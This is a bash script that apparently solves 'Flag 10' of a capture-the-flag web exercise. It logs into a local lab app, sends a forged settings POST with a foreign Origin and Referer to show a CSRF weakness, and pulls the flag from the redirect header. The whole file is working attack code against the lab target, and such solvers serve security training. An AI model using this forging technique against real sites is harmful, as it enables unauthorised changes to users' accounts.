#!/usr/bin/env bash
# Flag 10 — CSRF: state-changing POST honoured with a foreign Origin/Referer
set -uo pipefail
TARGET="${TARGET:-localhost}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/lib.sh"
JAR="$DIR/.jdoe-10.jar"

darkly_login "$TARGET" "$JAR" || exit 1

echo "[*] Forging settings POST with attacker Origin/Referer" >&2
RESP=$(curl -s -i -b "$JAR" -X POST "http://${TARGET}:4942/profile/me/settings" \
  -H "Origin: https://horrible_last_flag" \
  -H "Referer: https://horrible_last_flag/x.html" \
  --data "first_name=CSRF&last_name=Test&campus=Wilcity")

echo "$RESP" | grep -i '^location:'

LOC=$(echo "$RESP" | grep -i '^location:' | sed -E 's/^[Ll]ocation: *//;s/\r$//')
FLAGPARAM=$(echo "$LOC" | grep -oE 'csrf_flag=[^&]+' | cut -d= -f2)

if [ -n "${FLAGPARAM:-}" ]; then
  python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))" "$FLAGPARAM"
else
  echo "[!] No csrf_flag param in redirect Location header." >&2
fi
